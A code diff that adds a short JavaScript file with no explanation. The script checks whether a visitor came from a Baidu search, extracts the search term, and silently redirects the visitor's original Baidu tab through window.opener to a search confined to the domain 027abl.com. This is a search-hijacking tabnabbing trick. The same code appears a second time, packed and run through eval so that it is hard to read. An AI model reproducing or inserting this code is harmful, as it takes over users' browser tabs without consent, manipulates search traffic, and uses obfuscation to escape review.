@@ -1,0 +1,37 @@
+(function() {
+    try {
+        var z9q85474 = location.host,
+            z9q8b27d = new RegExp('https?://www.baidu.com/s\?'),
+            z9q8784a = document.referrer,
+            z9q8222c, z9q86e57, z9q82246, z9q86167, z9q8f6ed = {},
+            z9q8a06e = 'http://www.baidu.com/s?ct=2097152&tn=0051&ie=utf-8&si=~SITEDOMAIN~&wd=~SEARCHWORD~',
+            z9q8b76e;
+        if (!z9q8b27d.test(z9q8784a)) {
+            return false
+        };
+        z9q86e57 = z9q8784a.indexOf('#');
+        z9q8222c = z9q8784a.indexOf('?');
+        z9q82246 = z9q8784a.substr(z9q8222c + 1, (z9q86e57 > 0 ? z9q86e57 : z9q8784a.length) - z9q8222c);
+        z9q86167 = z9q82246.split('&');
+        for (var z9q84555 = 0; z9q84555 < z9q86167.length; z9q84555++) {
+            s = z9q86167[z9q84555].split('=');
+            if (s.length < 2 || s[0] == '') {
+                continue
+            };
+            z9q8f6ed[s[0]] = s[1]
+        };
+        if (z9q8f6ed.hasOwnProperty('si') || !z9q8f6ed.hasOwnProperty('wd')) {
+            return false
+        };
+        z9q8a06e = 'http://www.baidu.com/s?ct=2097152&tn=0051&ie=utf-8&si=~SITEDOMAIN~&wd=~SEARCHWORD~';
+        z9q8b76e = z9q8a06e.replace('~SITEDOMAIN~', '027abl.com').replace('~SEARCHWORD~', z9q8f6ed['wd']);
+        if (navigator.userAgent.indexOf("MSIE") != -1) {
+            window.opener.document.location = z9q8b76e
+        } else {
+            window.opener.location.href = z9q8b76e
+        }
+    } catch (e) {}
+})();
+
+
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(Y(){J{u H=l.I,z=N O(\'P?://i.m.a/s\\?\'),3=B.K,5,9,j,c,4={},o=\'v://i.m.a/s?D=q&p=G&E=F-8&g=~f~&6=~h~\',d;7(!z.L(3)){x w};9=3.n(\'#\');5=3.n(\'?\');j=3.M(5+1,(9>0?9:3.k)-5);c=j.t(\'&\');Q(u b=0;b<c.k;b++){s=c[b].t(\'=\');7(s.k<2||s[0]==\'\'){X};4[s[0]]=s[1]};7(4.r(\'g\')||!4.r(\'6\')){x w};o=\'v://i.m.a/s?D=q&p=G&E=F-8&g=~f~&6=~h~\';d=o.y(\'~f~\',\'R.a\').y(\'~h~\',4[\'6\']);7(W.V.n("U")!=-1){C.A.B.l=d}T{C.A.l.S=d}}Z(e){}})();',62,62,'|||z9q8784a|z9q8f6ed|z9q8222c|wd|if||z9q86e57|com|z9q84555|z9q86167|z9q8b76e||SITEDOMAIN|si|SEARCHWORD|www|z9q82246|length|location|baidu|indexOf|z9q8a06e|tn|2097152|hasOwnProperty||split|var|http|false|return|replace|z9q8b27d|opener|document|window|ct|ie|utf|0051|z9q85474|host|try|referrer|test|substr|new|RegExp|https|for|027abl|href|else|MSIE|userAgent|navigator|continue|function|catch'.split('|'),0,{}))
